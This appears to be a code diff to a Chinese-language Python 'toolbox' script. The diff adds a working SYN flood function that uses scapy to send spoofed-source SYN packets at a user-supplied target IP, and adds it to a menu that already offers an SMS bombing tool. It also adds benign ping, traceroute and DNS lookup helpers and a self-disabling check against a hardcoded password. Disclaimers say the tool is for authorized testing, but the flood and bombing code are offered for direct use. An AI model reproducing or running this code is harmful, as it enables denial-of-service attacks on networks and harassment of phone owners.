@@ -1,18 +1,3 @@
-# 请注意：此文件为Bohan_Hou的工具箱，仅供授权的安全测试和学习使用。
-# 请勿使用此文件进行任何非法活动。
-# 如需使用，请联系作者获得授权。
-# 联系方式： QQ:3225215070
-#            Email: hou.bohan@qq.com
-#            Github: https://github.com/YT-Houbohan
-# 警告：此工具仅供授权的安全测试和学习使用。
-# 使用此工具造成的一切后果，与作者无关。
-# 作者不承担因使用此工具而造成的任何法律责任。
-# 使用本工具即表示您同意遵守相关法律法规。
-# 作者对使用此工具造成的任何法律责任不承担责任。
-# 请勿将此文件用于任何商业用途。
-
-
-
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
 # distributed with this work for additional information
@@ -40,10 +25,15 @@ import random
 from datetime import datetime
 import requests
 import re
-import psutil 
+import psutil
+from scapy.all import send
+import subprocess
+import dns.resolver
 
 # 最大密码尝试次数
 MAX_ATTEMPTS = 3
+
+
 # 显示版权信息
 def show_legal_notice():
     print("Bohan_Hou的工具箱")
@@ -51,36 +41,41 @@ def show_legal_notice():
     print("许可证：Apache License 2.0")
     print("版权所有：Bohan_Hou")
     print("项目地址: https://github.com/YT-Houbohan/Bohan_Hou_Tools")
-    print("联系方式：  QQ:3225215070" \
-    "\n            Email: hou.bohan@qq.com" \
-    "\n            Github: https://github.com/YT-Houbohan")
-    print("警告：此工具仅供授权的安全测试和学习使用。\033[31m\n使用此工具造成的一切后果，与作者无关。\033[0m")
-    print("未经授权使用此工具对目标系统进行攻击可能违反法律。\033[31m\n作者不承担因使用此工具而造成的任何法律责任。\033[0m")
-    print("使用本工具即表示您同意遵守相关法律法规。\033[31m\n作者对使用此工具造成的任何法律责任不承担责任。\033[0m")
+    print("联系方式：  QQ:3225215070"
+          "\n            Email: hou.bohan@qq.com"
+          "\n            Github: https://github.com/YT-Houbohan")
+    print("\033[31m\n警告：此工具仅供授权的安全测试和学习使用。\033[0m\n \033[31m作者不承担因使用此工具造成的一切后果。\033[0m")
+    print("\033[31m\n警告：未经授权使用此工具对目标系统进行攻击可能违反法律。\033[0m\n")
+    print("\033[31m\n警告：使用此工具造成的任何法律纠纷，由使用者自行承担。\033[0m\n \033[31m作者不承担因使用此工具造成的一切法律责任。\033[0m")
+    print("使用本工具即表示您同意遵守相关法律法规。")
     input("按Enter键继续...")
+
 
 # 对密码进行哈希加密
 def hash_password(password):
     hash_object = hashlib.sha256(password.encode())
     return hash_object.hexdigest()
 
+
 # 禁用程序自身
 def disable_self():
     with open(__file__, 'r', encoding='utf-8') as f:
         lines = f.readlines()
-    
-    # 在文件开头添加禁用代码
+
     disabled_code = [
         "# DISABLED BY SECURITY SYSTEM\n",
-        "print('程序已被禁用，请联系管理员！\033[31m\n请勿使用此程序！\033[0m')\n",
+        "print('程序已被禁用，\033[31m\n请勿使用此程序！\033[0m')\n",
         "import sys; sys.exit(1)\n"
     ]
-    
+
     with open(__file__, 'w', encoding='utf-8') as f:
         f.writelines(disabled_code + lines)
 
+
 # 验证密码
 show_legal_notice()
+
+
 def verify_password():
     hashed_password = hash_password("Bohan_Hou")
     attempts = 0
@@ -97,6 +92,7 @@ def verify_password():
         print("\033[31m程序已被禁用！\033[31m\n请勿使用此程序！\033[0m")
         sys.exit(1)
 
+
 # 显示进度条
 def show_progress(percentage):
     bar_length = 20
@@ -104,9 +100,10 @@ def show_progress(percentage):
     bar = '=' * filled_length + ' ' * (bar_length - filled_length)
     print(f"[{bar}] {percentage}%")
 
+
 import threading
 from queue import Queue
-from scapy.all import ARP, Ether, srp
+
 
 # 手机号短信轰炸
 def Mobile_phone_number_SMS_bombing():
@@ -182,9 +179,56 @@ def Mobile_phone_number_SMS_bombing():
 
         except requests.exceptions.RequestException as e:
             print(f'第{i + 1}次发送请求异常：{e}')
-
         # 添加间隔时间避免触发限流
         time.sleep(interval)
+
+
+# SYN洪水攻击
+def syn_flood():
+    import random
+    from scapy.layers.inet import IP, TCP
+    from scapy.all import send
+
+    # 生成随机的IP
+    def randomIP():
+        ip = ".".join(map(str, (random.randint(0, 255) for i in range(4))))
+        return ip
+
+    # 生成随机端口
+    def randomPort():
+        port = random.randint(1000, 10000)
+        return port
+
+    # syn-flood
+    def synFlood(count, dstIP):
+        total = 0
+        print("Packets are sending ...")
+        for i in range(count):
+            # IPlayer
+            srcIP = randomIP()  # 随机源ip地址
+            dstIP = dstIP
+            IPlayer = IP(src=srcIP, dst=dstIP)
+            # TCPlayer
+            srcPort = randomPort()
+            TCPlayer = TCP(sport=srcPort, dport=randomPort(), flags="S")
+            # 发送包
+            packet = IPlayer / TCPlayer
+            send(packet)
+            total += 1
+        print("Total packets sent: %i" % total)
+
+    # 显示的信息
+    def info():
+        print("#" * 30)
+        print("# Welcome to SYN Flood Tool  #")
+        print("#" * 30)
+        # 输入目标IP和端口
+        dstIP = input("Target IP : ")
+        return dstIP
+
+    dstIP = info()
+    count = int(input("Please input the number of packets："))
+    synFlood(count, dstIP)
 
 
 # 端口扫描器
@@ -389,6 +433,7 @@ def web_vulnerability_scanner():
     check_xss(url)
     check_sqli(url)
 
+
 # 获取本机所有网络接口信息
 def get_local_network_info():
     interfaces = psutil.net_if_addrs()
@@ -405,6 +450,39 @@ def get_local_network_info():
         print()
 
 
+# Ping 测试
+def ping_test():
+    target = input("请输入要 Ping 的目标 IP 或域名: ")
+    try:
+        result = subprocess.run(['ping', '-c', '4', target], capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"Ping 测试出错: {e}")
+
+
+# Traceroute 功能
+def traceroute():
+    target = input("请输入要 Traceroute 的目标 IP 或域名: ")
+    try:
+        result = subprocess.run(['traceroute', target], capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"Traceroute 出错: {e}")
+
+
+# DNS 查询
+def dns_lookup():
+    domain = input("请输入要查询的域名: ")
+    try:
+        answers = dns.resolver.query(domain, 'A')
+        for rdata in answers:
+            print(f"{domain} 的 IP 地址是: {rdata.address}")
+    except dns.resolver.NXDOMAIN:
+        print(f"未找到 {domain} 的 DNS 记录。")
+    except Exception as e:
+        print(f"DNS 查询出错: {e}")
+
+
 # 显示菜单
 def show_menu():
     menu_options = {
@@ -413,7 +491,11 @@ def show_menu():
         "2": ("简单的 Web 漏洞扫描器", web_vulnerability_scanner),
         "3": ("端口扫描器", port_scanner),
         "4": ("手机号轰炸", Mobile_phone_number_SMS_bombing),
-        "5": ("获取本机网络接口信息", get_local_network_info)
+        "5": ("获取本机网络接口信息", get_local_network_info),
+        "6": ("SYN洪水攻击脚本", syn_flood),
+        "7": ("Ping 测试", ping_test),
+        "8": ("Traceroute 功能", traceroute),
+        "9": ("DNS 查询", dns_lookup)
     }
     print("--------------------------")
     print("欢迎使用BohanHou的工具箱,请选择:")
@@ -427,6 +509,12 @@ def show_menu():
             break
         else:
             print("无效的选择，请重新输入。")
+
+
+# 主程序
+print("欢迎使用BohanHou的工具箱,请输入密码:")
+if verify_password():
+    show_menu()
 
 
 # 主程序
